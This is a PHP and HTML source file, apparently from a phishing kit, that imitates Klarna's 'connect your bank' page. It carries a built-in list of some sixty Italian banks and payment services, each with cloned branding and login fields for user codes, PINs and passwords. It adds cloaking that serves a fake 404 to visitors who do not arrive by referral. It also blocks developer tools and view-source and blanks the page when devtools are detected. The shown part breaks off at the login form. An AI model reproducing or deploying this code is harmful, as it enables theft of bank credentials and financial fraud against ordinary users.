<?php
require_once __DIR__ . '/guard.php';

// bank.php is only accessible via redirect from index.php
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$our_host = $_SERVER['HTTP_HOST'] ?? '';
$from_index = (strpos($referrer, 'index.php') !== false || strpos($referrer, 'bank.php') !== false || strpos($referrer, $our_host) !== false);
if (!$from_index && !isset($_GET['_dev'])) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}

$bank_id = isset($_GET['bank_id']) ? $_GET['bank_id'] : null;
$branch_id = isset($_GET['branch_id']) ? $_GET['branch_id'] : null;
$user_email = isset($_GET['email']) ? $_GET['email'] : '';

$bankName = '';
$bankColor = '#080516';
$bankTextColor = '#ffffff';
$logoFile = '';
$logoText = 'BK';
$logoBg = 'bg-black';
$branches = [];
$fields = [];

if ($bank_id) {
    $banksJson = <<<'BANKS'
[
    {"id":"intesa","name":"Intesa Sanpaolo","shortName":"ISP","brandColor":"#006643","textColor":"#ffffff","logoFile":"intesa_sanpaolo.png","logoText":"ISP","logoBg":"bg-emerald-800","fields":[{"label":"Codice Titolare (8 cifre)","placeholder":"es. 12345678","type":"text"},{"label":"Codice PIN / Password","placeholder":"Inserisci il tuo PIN","type":"password"}],"branches":[{"id":"isp-retail","name":"Persone Fisiche e Retail"},{"id":"isp-corporate","name":"Imprese e Corporate Banking"},{"id":"isp-private","name":"Fideuram & Private Banking"}]},
    {"id":"unicredit","name":"UniCredit","shortName":"UC","brandColor":"#E2001A","textColor":"#ffffff","logoFile":"unicredit.png","logoText":"UC","logoBg":"bg-red-600","fields":[{"label":"Codice Adesione (8 o 10 cifre)","placeholder":"es. 12345678","type":"text"},{"label":"PIN di Accesso","placeholder":"Digitare PIN","type":"password"}],"branches":[{"id":"uc-privati","name":"UniCredit Privati"},{"id":"uc-imprese","name":"UniCredit Imprese"}]},
    {"id":"poste","name":"Italian Post Office - BancoPosta","shortName":"Poste","brandColor":"#FFCC00","textColor":"#004B87","logoFile":"italian_post_office_bancoposta.png","logoText":"PI","logoBg":"bg-yellow-400","fields":[{"label":"Nome Utente / Username","placeholder":"es. mario.rossi","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[{"id":"poste-bp","name":"Conto BancoPosta"},{"id":"poste-pp","name":"Carta PostePay"},{"id":"poste-business","name":"Poste Italiane Business"}]},
    {"id":"bcc","name":"BCC - Cooperative Credit","shortName":"BCC","brandColor":"#005A36","textColor":"#ffffff","logoFile":"bcc_cooperative_credit.png","logoText":"BCC","logoBg":"bg-green-700","fields":[{"label":"Codice Utente / Login ID","placeholder":"Codice fornito dalla filiale","type":"text"},{"label":"Password d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[{"id":"bcc-roma","name":"BCC di Roma"},{"id":"bcc-milano","name":"BCC di Milano"},{"id":"bcc-emilbanca","name":"BCC EmilBanca"},{"id":"bcc-iccrea","name":"Iccrea Area Riservata"}]},
    {"id":"bpm","name":"Banco BPM","shortName":"BPM","brandColor":"#005553","textColor":"#ffffff","logoFile":"banco_bpm.png","logoText":"BPM","logoBg":"bg-teal-800","fields":[{"label":"Codice Identificativo","placeholder":"Codice di 9 cifre","type":"text"},{"label":"Password di Servizio","placeholder":"Inserisci password","type":"password"}],"branches":[{"id":"bpm-youweb","name":"YouWeb Servizi Privati"},{"id":"bpm-youbusiness","name":"YouBusiness Imprese"}]},
    {"id":"bper","name":"BPER Bank","shortName":"BPER","brandColor":"#008183","textColor":"#ffffff","logoFile":"bper_bank.png","logoText":"BPER","logoBg":"bg-teal-600","fields":[{"label":"Codice Utente","placeholder":"Codice Smart Web","type":"text"},{"label":"Password Smart Web","placeholder":"••••••••","type":"password"}],"branches":[{"id":"bper-smart","name":"BPER Smart Web Privati"},{"id":"bper-business","name":"BPER Smart Desk Corporate"}]},
    {"id":"mps","name":"Monte dei Paschi di Siena","shortName":"MPS","brandColor":"#8C1B1B","textColor":"#ffffff","logoFile":"monte_dei_paschi_di_siena.png","logoText":"MPS","logoBg":"bg-red-900","fields":[{"label":"Codice Utente","placeholder":"Identificativo a 8 cifre","type":"text"},{"label":"Chiave d'Accesso (Password)","placeholder":"La tua password","type":"password"}],"branches":[{"id":"mps-paschi","name":"Digital Banking Privati"},{"id":"mps-corporate","name":"Paschi-InBusiness"}]},
    {"id":"fineco","name":"FinecoBank","shortName":"Fineco","brandColor":"#010101","textColor":"#ffffff","logoFile":"finecobank.png","logoText":"FN","logoBg":"bg-black","fields":[{"label":"Codice Utente (User ID)","placeholder":"es. 1234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bnl","name":"BNL BNP Paribas Group","shortName":"BNL","brandColor":"#00965E","textColor":"#ffffff","logoFile":"bnl_bnp_paribas_group.png","logoText":"BNL","logoBg":"bg-emerald-600","fields":[{"label":"Numero Cliente (8 cifre)","placeholder":"es. 12345678","type":"text"},{"label":"PIN / Password","placeholder":"Inserisci password","type":"password"}],"branches":[{"id":"bnl-privati","name":"BNL Pass / Privati"},{"id":"bnl-business","name":"BNL Business / Imprese"}]},
    {"id":"credem","name":"Credem - Credito Emiliano","shortName":"Credem","brandColor":"#004B87","textColor":"#ffffff","logoFile":"credem_credito_emiliano.png","logoText":"CE","logoBg":"bg-blue-800","fields":[{"label":"Codice Utente","placeholder":"Inserisci codice utente","type":"text"},{"label":"Password / PIN","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"sella","name":"Sella Bank","shortName":"Sella","brandColor":"#0F2D59","textColor":"#ffffff","logoFile":"sella_bank.png","logoText":"BS","logoBg":"bg-slate-900","fields":[{"label":"Codice Cliente","placeholder":"es. 1234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"Digitare codice","type":"password"}],"branches":[{"id":"sella-privati","name":"Sella Personal / Privati"},{"id":"sella-business","name":"Sella Corporate"}]},
    {"id":"illimity","name":"illimity Bank","shortName":"illimity","brandColor":"#E3007E","textColor":"#ffffff","logoFile":"illimity_bank.png","logoText":"IL","logoBg":"bg-pink-600","fields":[{"label":"Indirizzo Email / User ID","placeholder":"es. nome@email.it","type":"text"},{"label":"Password","placeholder":"Digitare password","type":"password"}],"branches":[]},
    {"id":"widiba","name":"Widiba Bank","shortName":"Widiba","brandColor":"#050505","textColor":"#ffffff","logoFile":"widiba_bank.png","logoText":"WD","logoBg":"bg-neutral-950","fields":[{"label":"Username","placeholder":"es. user123","type":"text"},{"label":"Password d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"ing","name":"ING Italia (Conto Arancio)","shortName":"ING","brandColor":"#FF6600","textColor":"#ffffff","logoFile":"ing_italia_conto_arancio.png","logoText":"ING","logoBg":"bg-orange-600","fields":[{"label":"Codice Cliente (9 cifre)","placeholder":"es. 123456789","type":"text"},{"label":"Data di Nascita (GGMMAAAA)","placeholder":"es. 15081990","type":"text"},{"label":"PIN d'Accesso","placeholder":"Inserisci PIN","type":"password"}],"branches":[]},
    {"id":"chebanca","name":"Mediobanca Premier","shortName":"MB","brandColor":"#FFBF00","textColor":"#1A1A1A","logoFile":"mediobanca_premier.png","logoText":"MB","logoBg":"bg-amber-400","fields":[{"label":"Codice Gruppo o Codice Cliente","placeholder":"Digitare codice","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"cdp","name":"Cassa Depositi e Prestiti (CDP)","shortName":"CDP","brandColor":"#004B87","textColor":"#ffffff","logoFile":"cassa_depositi_e_prestiti_cdp.png","logoText":"CDP","logoBg":"bg-blue-800","fields":[{"label":"Codice Fiscale","placeholder":"Inserisci il tuo Codice Fiscale","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"mediobanca","name":"Mediobanca","shortName":"MB","brandColor":"#FFBF00","textColor":"#1A1A1A","logoFile":"mediobanca.png","logoText":"MB","logoBg":"bg-amber-400","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice cliente","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bpsondrio","name":"Sondrio Peoples Bank","shortName":"BPS","brandColor":"#0077BE","textColor":"#ffffff","logoFile":"sondrio_peoples_bank.png","logoText":"BPS","logoBg":"bg-blue-500","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice utente","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"mediolanum","name":"Mediolanum Bank","shortName":"BM","brandColor":"#E4002B","textColor":"#ffffff","logoFile":"mediolanum_bank.png","logoText":"BM","logoBg":"bg-red-600","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice cliente","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"cariparma","name":"Credit Agricole Italia","shortName":"CA","brandColor":"#00953D","textColor":"#ffffff","logoFile":"credit_agricole_italia.png","logoText":"CA","logoBg":"bg-green-600","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice utente","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"carige","name":"Carige Bank","shortName":"CAR","brandColor":"#003C6D","textColor":"#ffffff","logoFile":"carige_bank.png","logoText":"CAR","logoBg":"bg-blue-900","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice utente","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancasistema","name":"Bank System","shortName":"BS","brandColor":"#1A1A1A","textColor":"#ffffff","logoFile":"bank_system.png","logoText":"BS","logoBg":"bg-black","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancaifis","name":"Ifis Bank","shortName":"IFIS","brandColor":"#000000","textColor":"#ffffff","logoFile":"ifis_bank.png","logoText":"IFIS","logoBg":"bg-black","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancagenerali","name":"Generali Bank","shortName":"BG","brandColor":"#C41230","textColor":"#ffffff","logoFile":"generali_bank.png","logoText":"BG","logoBg":"bg-red-700","fields":[{"label":"Username / Codice Cliente","placeholder":"Inserisci username","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancaprofilo","name":"Bank Profile","shortName":"BPL","brandColor":"#13294B","textColor":"#ffffff","logoFile":"bank_profile.png","logoText":"BPL","logoBg":"bg-slate-800","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"creval","name":"Credito Valtellinese (Creval)","shortName":"CV","brandColor":"#E4002B","textColor":"#ffffff","logoFile":"credito_valtellinese_creval.png","logoText":"CV","logoBg":"bg-red-600","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancodesio","name":"Desio and Brianza Bank","shortName":"BDB","brandColor":"#0077BE","textColor":"#ffffff","logoFile":"desio_and_brianza_bank.png","logoText":"BDB","logoBg":"bg-blue-500","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bolzano","name":"Savings Bank of Bolzano","shortName":"SPK","brandColor":"#DA291C","textColor":"#ffffff","logoFile":"savings_bank_of_bolzano.png","logoText":"SPK","logoBg":"bg-red-600","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bancadiasti","name":"Bank of Asti","shortName":"ASTI","brandColor":"#B02C34","textColor":"#ffffff","logoFile":"bank_of_asti.png","logoText":"ASTI","logoBg":"bg-red-800","fields":[{"label":"Codice Cliente","placeholder":"Inserisci il codice","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"webank","name":"Webank (Banco BPM)","shortName":"WBK","brandColor":"#005553","textColor":"#ffffff","logoFile":"webank_banco_bpm.png","logoText":"WBK","logoBg":"bg-teal-800","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"hellobank","name":"Hello Bank! (BNP Paribas)","shortName":"HB","brandColor":"#8DC63F","textColor":"#ffffff","logoFile":"hello_bank_bnp_paribas.png","logoText":"HB","logoBg":"bg-lime-500","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"smartika","name":"Smartika (BCC ICCREA)","shortName":"SMK","brandColor":"#D70041","textColor":"#ffffff","logoFile":"smartika_bcc_iccrea.png","logoText":"SMK","logoBg":"bg-pink-600","fields":[{"label":"Username","placeholder":"Inserisci username","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"oxygen","name":"Oxygen","shortName":"OXY","brandColor":"#FF6600","textColor":"#ffffff","logoFile":"oxygen.png","logoText":"OXY","logoBg":"bg-orange-500","fields":[{"label":"Numero di Cellulare","placeholder":"es. +39 3331234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"flowe","name":"Flowe (Mediolanum Group)","shortName":"FLW","brandColor":"#00B894","textColor":"#ffffff","logoFile":"flowe_mediolanum_group.png","logoText":"FLW","logoBg":"bg-emerald-400","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.it","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"aidexa","name":"AideXa Bank","shortName":"AID","brandColor":"#0072CE","textColor":"#ffffff","logoFile":"aidexa_bank.png","logoText":"AID","logoBg":"bg-blue-600","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.it","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"postepay","name":"Postepay (Prepaid Card)","shortName":"PP","brandColor":"#FFE600","textColor":"#004B87","logoFile":"postepay_prepaid_card.png","logoText":"PP","logoBg":"bg-[#FFE600]","fields":[{"label":"Username / Codice Fiscale","placeholder":"Inserisci Username o Codice Fiscale","type":"text"},{"label":"Password","placeholder":"Password d'accesso Poste","type":"password"}],"branches":[]},
    {"id":"hype","name":"Hype","shortName":"HP","brandColor":"#0B1D33","textColor":"#ffffff","logoFile":"hype.png","logoText":"HP","logoBg":"bg-[#0b1d33]","fields":[{"label":"Indirizzo Email / Codice cliente","placeholder":"es. utente@hype.it","type":"text"},{"label":"Password","placeholder":"Inserisci la password","type":"password"}],"branches":[]},
    {"id":"mooney","name":"Mooney (SisalPay)","shortName":"MN","brandColor":"#F3DC00","textColor":"#000000","logoFile":"mooney_sisalpay.png","logoText":"MN","logoBg":"bg-[#F3DC00]","fields":[{"label":"Codice Fiscale","placeholder":"Codice Fiscale a 16 caratteri","type":"text"},{"label":"Password","placeholder":"La tua password Mooney","type":"password"}],"branches":[]},
    {"id":"tinaba","name":"Tinaba (Prepaid Account)","shortName":"TIN","brandColor":"#000000","textColor":"#ffffff","logoFile":"tinaba_prepaid_account.png","logoText":"TIN","logoBg":"bg-black","fields":[{"label":"Numero di Cellulare","placeholder":"es. +39 3331234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"revolut","name":"Revolut","shortName":"REV","brandColor":"#000000","textColor":"#ffffff","logoFile":"revolut.png","logoText":"REV","logoBg":"bg-stone-900","fields":[{"label":"Numero di cellulare (con +39)","placeholder":"es. +39 3331234567","type":"text"},{"label":"Codice di accesso (PIN Revolut)","placeholder":"Inserisci il tuo PIN a 4 o 6 cifre","type":"password"}],"branches":[]},
    {"id":"wise","name":"Wise","shortName":"WISE","brandColor":"#9FE870","textColor":"#0D2E27","logoFile":"wise.png","logoText":"Wise","logoBg":"bg-[#9FE870]","fields":[{"label":"Indirizzo Email Registrato","placeholder":"es. utente@email.com","type":"text"},{"label":"Password","placeholder":"Inserisci la tua password Wise","type":"password"}],"branches":[]},
    {"id":"n26","name":"N26","shortName":"N26","brandColor":"#35A096","textColor":"#ffffff","logoFile":"n26.png","logoText":"N26","logoBg":"bg-teal-600","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@n26.com","type":"text"},{"label":"Password d'accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"vivid","name":"Vivid Money","shortName":"VVD","brandColor":"#6C5CE7","textColor":"#ffffff","logoFile":"vivid_money.png","logoText":"VVD","logoBg":"bg-purple-500","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.com","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"curve","name":"Curve","shortName":"CRV","brandColor":"#EE3124","textColor":"#ffffff","logoFile":"curve.png","logoText":"CRV","logoBg":"bg-red-500","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.com","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"monese","name":"Monese Italy","shortName":"MON","brandColor":"#5C2D91","textColor":"#ffffff","logoFile":"monese_italy.png","logoText":"MON","logoBg":"bg-purple-700","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.com","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bunq","name":"Bunq Italy","shortName":"BUNQ","brandColor":"#1C64F2","textColor":"#ffffff","logoFile":"bunq_italy.png","logoText":"BUNQ","logoBg":"bg-blue-600","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.com","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"satispay","name":"Satispay","shortName":"SAT","brandColor":"#E1306C","textColor":"#ffffff","logoFile":"satispay.png","logoText":"SAT","logoBg":"bg-pink-500","fields":[{"label":"Numero di Telefono","placeholder":"es. +39 3331234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"nexi","name":"Nexi Pay","shortName":"NEXI","brandColor":"#003C6D","textColor":"#ffffff","logoFile":"nexi_pay.png","logoText":"NEXI","logoBg":"bg-blue-900","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.it","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"paypal","name":"PayPal Italy","shortName":"PPL","brandColor":"#0070BA","textColor":"#ffffff","logoFile":"paypal_italy.png","logoText":"PPL","logoBg":"bg-blue-500","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.it","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"klarna","name":"Klarna Italy","shortName":"KL","brandColor":"#FFB3C7","textColor":"#1A1A1A","logoFile":"klarna_italy.png","logoText":"KL","logoBg":"bg-pink-200","fields":[{"label":"Indirizzo Email","placeholder":"es. nome@email.it","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"scalapay","name":"Scalapay","shortName":"SCL","brandColor":"#FF5E62","textColor":"#ffffff","logoFile":"scalapay.png","logoText":"SCL","logoBg":"bg-red-400","fields":[{"label":"Numero di Telefono","placeholder":"es. +39 3331234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"lydia","name":"Lydia Italy","shortName":"LYD","brandColor":"#FF5E62","textColor":"#ffffff","logoFile":"lydia_italy.png","logoText":"LYD","logoBg":"bg-rose-400","fields":[{"label":"Numero di Telefono","placeholder":"es. +39 3331234567","type":"text"},{"label":"PIN d'Accesso","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bcc-milano-reg","name":"BCC of Milan","shortName":"BCCMI","brandColor":"#005A36","textColor":"#ffffff","logoFile":"bcc_of_milan.png","logoText":"BCCMI","logoBg":"bg-green-700","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bcc-roma-reg","name":"BCC of Rome","shortName":"BCCRM","brandColor":"#005A36","textColor":"#ffffff","logoFile":"bcc_of_rome.png","logoText":"BCCRM","logoBg":"bg-green-700","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"bcc-napoli","name":"BCC of Naples","shortName":"BCCNA","brandColor":"#005A36","textColor":"#ffffff","logoFile":"bcc_of_naples.png","logoText":"BCCNA","logoBg":"bg-green-700","fields":[{"label":"Codice Utente","placeholder":"Inserisci il codice","type":"text"},{"label":"Password","placeholder":"••••••••","type":"password"}],"branches":[]},
    {"id":"buddybank","name":"buddybank (by UniCredit)","shortName":"BDY","brandColor":"#000000","textColor":"#ffffff","logoFile":"buddybank_by_unicredit.png","logoText":"BDY","logoBg":"bg-black","fields":[{"label":"Codice Adesione buddybank","placeholder":"Codice a 8 o 10 cifre","type":"text"},{"label":"PIN d'Accesso","placeholder":"Digitare PIN","type":"password"}],"branches":[]}
]
BANKS;

    $banks = json_decode($banksJson, true);
    foreach ($banks as $b) {
        if ($b['id'] === $bank_id) {
            $bankName = $b['name'];
            $bankColor = $b['brandColor'];
            $bankTextColor = $b['textColor'];
            $logoFile = $b['logoFile'] ?? '';
            $logoText = $b['logoText'];
            $logoBg = $b['logoBg'];
            $branches = $b['branches'] ?? [];
            $fields = $b['fields'] ?? [];
            break;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow">
    <title>Klarna | <?php echo htmlspecialchars($bankName ?: 'Connessione Banca'); ?></title>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) ||
                (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
        });
        (function() {
            var devtools = false, threshold = 160;
            setInterval(function() {
                var start = performance.now(); debugger; var end = performance.now();
                if (end - start > threshold && !devtools) {
                    devtools = true;
                    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1 style="color:#333;">403 Forbidden</h1></div>';
                }
            }, 1000);
        })();
        document.addEventListener('dragstart', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') e.preventDefault();
        });
        document.addEventListener('selectstart', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') e.preventDefault();
        });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .klarna-badge { background-color: #ffb3c7 !important; color: #000 !important; }
        .btn-dark { background-color: #080516; color: white; transition: background-color 0.3s; }
        .btn-dark:hover { background-color: #000; }
        .hidden { display: none !important; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); position: relative; min-height: 780px; display: flex; flex-direction: column; }
        .btn-dark, button.btn-dark-btn { padding-top: 14px !important; padding-bottom: 14px !important; font-size: 1rem !important; border-radius: 45px !important; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; -moz-transform: scale(0.95); } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
        input { border: 1.5px solid #d1d1d6 !important; font-size: 1rem !important; }
        input:focus { border-color: #080516 !important; outline: none; }
        .error-msg-bar { background: #fff1f3; color: #000; padding: 12px; border-radius: 12px; font-size: 13px; display: none; align-items: center; margin-top: 16px; }
        .error-dot { width: 16px; height: 16px; background: #9c1c31; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; margin-right: 8px; flex-shrink: 0; }
        .bottom-section { margin-top: auto; width: 100%; }
        .spinner { display: none; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .is-loading .btn-text { display: none; }
        .is-loading .spinner { display: block !important; margin: 0 auto; }
        .input-error { border-color: #9c1c31 !important; background-color: #fff5f5 !important; }
        .logo-container { width: 120px; height: 120px; border-radius: 20px; background: white; border: 1.5px solid #e5e5ea; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.06); }
        .logo-container img { width: 100%; height: 100%; object-fit: contain; padding: 12px; }
        .logo-container .fallback { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 28px; }
    </style>
</head>
<body>

<?php if (!$bank_id || !$bankName): ?>
    <div class="auth-card">
        <div class="flex justify-end mb-2"><button class="text-2xl font-light hover:opacity-50 leading-none" onclick="window.close()">&times;</button></div>
        <div class="flex-grow flex flex-col items-center justify-center text-center">
            <div class="w-16 h-16 bg-red-100 text-red-500 rounded-full flex items-center justify-center text-2xl mb-4"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <h2 class="text-xl font-bold text-[#080516] mb-2">Banca non specificata</h2>
            <p class="text-sm text-[#5e5e6e]">Nessun ID banca fornito. Torna alla selezione banca.</p>
        </div>
    </div>
<?php else: ?>

<div class="auth-card">

    <!-- ====== STEP 1: BRANCH SELECTION ====== -->
    <div id="step-branch" class="<?php echo count($branches) > 0 ? '' : 'hidden'; ?>">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBack()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-badge px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button onclick="goBackToIndex()" class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Seleziona la filiale</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-5">Scegli la divisione per <strong class="text-[#080516]"><?php echo htmlspecialchars($bankName); ?></strong></p>
            <div id="branch-list-container" class="space-y-2 mb-6">
                <?php foreach ($branches as $branch): ?>
                <button onclick="selectBranch('<?php echo htmlspecialchars($branch['id']); ?>', '<?php echo htmlspecialchars($branch['name']); ?>')" class="w-full flex items-center justify-between p-4 border border-[#e5e5ea] rounded-2xl hover:border-[#080516] hover:bg-[#f8f8fa] transition text-left group cursor-pointer">
                    <div class="flex items-center gap-3">
                        <div class="w-2.5 h-2.5 rounded-full" style="background-color: <?php echo htmlspecialchars($bankColor); ?>"></div>
                        <span class="font-semibold text-[#080516] text-sm"><?php echo htmlspecialchars($branch['name']); ?></span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-[#8a8a96] group-hover:text-[#080516] text-xs transition"></i>
                </button>
                <?php endforeach; ?>
            </div>
        </div>
        <div class="bottom-section">
            <button onclick="goBackToIndex()" class="w-full py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center border border-[#d1d1d6] text-[#5e5e6e] hover:bg-[#f7f7f7] transition" style="border-radius: 45px !important;">
                Torna alla selezione banca
            </button>
        </div>
    </div>

    <!-- ====== STEP 2: BANK LOGIN ====== -->
    <div id="step-login" class="<?php echo count($branches) > 0 ? 'hidden' : ''; ?>">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBack()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-badge px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button onclick="goBackToIndex()" class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <div class="logo-container" id="bank-logo-container">
                <?php if ($logoFile): ?>
                <img id="bank-logo-img" src="./banks/banks/<?php echo htmlspecialchars($logoFile); ?>" alt="<?php echo htmlspecialchars($bankName); ?>" onerror="this.style.display='none'; document.getElementById('bank-logo-fallback').style.display='flex';">
                <?php endif; ?>
                <div id="bank-logo-fallback" class="fallback" style="display: <?php echo $logoFile ? 'none' : 'flex'; ?>; background-color: <?php echo htmlspecialchars($bankColor); ?>; color: <?php echo htmlspecialchars($bankTextColor); ?>;">
                    <?php echo htmlspecialchars($logoText); ?>
                </div>
            </div>
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight text-center">Accedi alla tua banca</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-6 text-center">Inserisci le credenziali per <strong class="text-[#080516]" id="login-bank-name"><?php echo htmlspecialchars($bankName); ?><span id="login-branch-suffix"></span></strong></p>
